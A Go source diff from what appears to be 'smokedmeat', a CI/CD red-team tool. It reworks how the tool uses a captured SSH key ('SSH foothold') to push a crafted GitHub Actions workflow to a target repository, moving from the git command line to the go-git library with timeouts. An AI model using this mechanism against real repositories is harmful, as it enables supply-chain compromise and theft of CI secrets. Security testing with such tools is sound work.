@@ -5,22 +5,40 @@ package tui
 
 import (
 	"context"
+	"crypto/rand"
+	"encoding/hex"
+	"errors"
 	"fmt"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"strings"
 	"time"
 
 	tea "charm.land/bubbletea/v2"
+	git "github.com/go-git/go-git/v5"
+	"github.com/go-git/go-git/v5/config"
+	"github.com/go-git/go-git/v5/plumbing"
+	"github.com/go-git/go-git/v5/plumbing/object"
+	"github.com/go-git/go-git/v5/plumbing/transport"
 
 	"github.com/boostsecurityio/smokedmeat/internal/counter"
 )
 
 var pushRunnerTargetWorkflowViaSSHFn = pushRunnerTargetWorkflowViaSSH
+var runnerTargetWorkflowRemoteURLFn = runnerTargetWorkflowRemoteURL
+
+const gitOperationTimeout = 60 * time.Second
 
 func generateRunnerTargetBranchName(now time.Time) string {
-	return fmt.Sprintf("smokedmeat-runner-%d", now.Unix())
+	return fmt.Sprintf("smokedmeat-runner-%d-%s", now.Unix(), runnerTargetBranchSuffix(now))
+}
+
+func runnerTargetBranchSuffix(now time.Time) string {
+	var buf [2]byte
+	if _, err := rand.Read(buf[:]); err == nil {
+		return hex.EncodeToString(buf[:])
+	}
+	return fmt.Sprintf("%04x", now.Nanosecond()&0xffff)
 }
 
 func (m Model) deployAutoDispatch(vuln *Vulnerability, stagerID, payload string, token *CollectedSecret, inputName string, dwellTime time.Duration) tea.Cmd {
@@ -160,6 +178,9 @@ func (m Model) deployRunnerTargetAutoWorkflowPush(target *RunnerTargetSelection,
 			if err != nil {
 				return RunnerTargetWorkflowPushFailedMsg{StagerID: stagerID, Target: target, Err: err}
 			}
+			if strings.TrimSpace(pushedBranch) == "" {
+				return RunnerTargetWorkflowPushFailedMsg{StagerID: stagerID, Target: target, Err: fmt.Errorf("workflow push succeeded without a branch name")}
+			}
 			return RunnerTargetWorkflowPushSuccessMsg{
 				StagerID:  stagerID,
 				Target:    target,
@@ -186,6 +207,9 @@ func (m Model) deployRunnerTargetAutoWorkflowPush(target *RunnerTargetSelection,
 		if err != nil {
 			return RunnerTargetWorkflowPushFailedMsg{StagerID: stagerID, Target: target, Err: err}
 		}
+		if strings.TrimSpace(resp.Branch) == "" {
+			return RunnerTargetWorkflowPushFailedMsg{StagerID: stagerID, Target: target, Err: fmt.Errorf("workflow push succeeded without a branch name")}
+		}
 
 		return RunnerTargetWorkflowPushSuccessMsg{
 			StagerID:  stagerID,
@@ -203,32 +227,49 @@ func pushRunnerTargetWorkflowViaSSH(ss *SSHState, repo, branchName, workflowPath
 		return "", "", fmt.Errorf("SSH foothold is not active")
 	}
 
+	auth, err := newGitHubGitAuth(ss.KeyValue)
+	if err != nil {
+		return "", "", fmt.Errorf("invalid SSH private key: %w", err)
+	}
+
+	return pushRunnerTargetWorkflowWithGit(context.Background(), auth, repo, runnerTargetWorkflowRemoteURLFn(repo), branchName, workflowPath, workflowYAML, commitMessage)
+}
+
+func runnerTargetWorkflowRemoteURL(repo string) string {
+	return "ssh://git@github.com/" + repo + ".git"
+}
+
+func pushRunnerTargetWorkflowWithGit(parent context.Context, auth transport.AuthMethod, repo, remoteURL, branchName, workflowPath, workflowYAML, commitMessage string) (branchNameOut, branchURL string, err error) {
 	tmpDir, err := os.MkdirTemp("", "smokedmeat-runner-push-*")
 	if err != nil {
 		return "", "", fmt.Errorf("failed to create temp dir: %w", err)
 	}
 	defer os.RemoveAll(tmpDir)
 
-	sshState := &SSHState{
-		KeyValue: ss.KeyValue,
-		TempDir:  tmpDir,
-	}
-	if err := setupSSHShellHome(sshState); err != nil {
-		return "", "", fmt.Errorf("failed to prepare SSH home: %w", err)
-	}
-
 	if strings.TrimSpace(branchName) == "" {
 		branchName = generateRunnerTargetBranchName(time.Now())
 	}
 	repoDir := filepath.Join(tmpDir, "repo")
-	env := append(os.Environ(), sshShellEnv(sshState, sshState.TempDir)...)
-	remote := "ssh://git@github.com/" + repo + ".git"
+	ctx, cancel := context.WithTimeout(parent, gitOperationTimeout)
+	defer cancel()
 
-	if err := runGitWithEnv(tmpDir, env, "clone", "--depth=1", remote, repoDir); err != nil {
-		return "", "", err
+	gitRepo, err := git.PlainCloneContext(ctx, repoDir, false, &git.CloneOptions{
+		URL:   remoteURL,
+		Auth:  auth,
+		Depth: 1,
+	})
+	if err != nil {
+		return "", "", gitOperationError(ctx, "clone repository", err)
 	}
-	if err := runGitWithEnv(repoDir, env, "checkout", "-b", branchName); err != nil {
-		return "", "", err
+
+	worktree, err := gitRepo.Worktree()
+	if err != nil {
+		return "", "", fmt.Errorf("failed to open git worktree: %w", err)
+	}
+
+	branchRef := plumbing.NewBranchReferenceName(branchName)
+	if err := worktree.Checkout(&git.CheckoutOptions{Branch: branchRef, Create: true}); err != nil {
+		return "", "", fmt.Errorf("failed to create branch %s: %w", branchName, err)
 	}
 
 	targetPath := filepath.Join(repoDir, filepath.FromSlash(workflowPath))
@@ -239,41 +280,42 @@ func pushRunnerTargetWorkflowViaSSH(ss *SSHState, repo, branchName, workflowPath
 		return "", "", fmt.Errorf("failed to write workflow file: %w", err)
 	}
 
-	if err := runGitWithEnv(repoDir, env, "add", workflowPath); err != nil {
-		return "", "", err
+	if _, err := worktree.Add(workflowPath); err != nil {
+		return "", "", fmt.Errorf("failed to stage %s: %w", workflowPath, err)
 	}
-	if err := runGitWithEnv(repoDir, env, gitCommitArgs(commitMessage)...); err != nil {
-		return "", "", err
+	if _, err := worktree.Commit(commitMessage, &git.CommitOptions{
+		Author:    runnerTargetGitSignature(),
+		Committer: runnerTargetGitSignature(),
+	}); err != nil {
+		return "", "", fmt.Errorf("failed to commit %s: %w", workflowPath, err)
 	}
-	if err := runGitWithEnv(repoDir, env, "push", "origin", branchName); err != nil {
-		return "", "", err
+
+	refSpec := config.RefSpec(fmt.Sprintf("%s:%s", branchRef, branchRef))
+	if err := gitRepo.PushContext(ctx, &git.PushOptions{
+		RemoteName: git.DefaultRemoteName,
+		Auth:       auth,
+		RefSpecs:   []config.RefSpec{refSpec},
+	}); err != nil && !errors.Is(err, git.NoErrAlreadyUpToDate) {
+		return "", "", gitOperationError(ctx, "push branch", err)
 	}
 
 	branchURL = fmt.Sprintf("https://github.com/%s/tree/%s", repo, branchName)
 	return branchName, branchURL, nil
 }
 
-func gitCommitArgs(message string) []string {
-	return []string{
-		"-c", "user.name=SmokedMeat Counter",
-		"-c", "user.email=smokedmeat@local.invalid",
-		"commit", "-m", message,
+func runnerTargetGitSignature() *object.Signature {
+	return &object.Signature{
+		Name:  "SmokedMeat Counter",
+		Email: "smokedmeat@local.invalid",
+		When:  time.Now(),
 	}
 }
 
-func runGitWithEnv(dir string, env []string, args ...string) error {
-	cmd := exec.Command("git", args...)
-	cmd.Dir = dir
-	cmd.Env = env
-	output, err := cmd.CombinedOutput()
-	if err != nil {
-		msg := strings.TrimSpace(string(output))
-		if msg == "" {
-			return fmt.Errorf("git %s failed: %w", strings.Join(args, " "), err)
-		}
-		return fmt.Errorf("git %s failed: %s", strings.Join(args, " "), msg)
+func gitOperationError(ctx context.Context, operation string, err error) error {
+	if ctx.Err() == context.DeadlineExceeded {
+		return fmt.Errorf("git %s timed out after %s", operation, gitOperationTimeout)
 	}
-	return nil
+	return fmt.Errorf("git %s failed: %w", operation, err)
 }
 
 func maskCommandToken(cmd string) string {
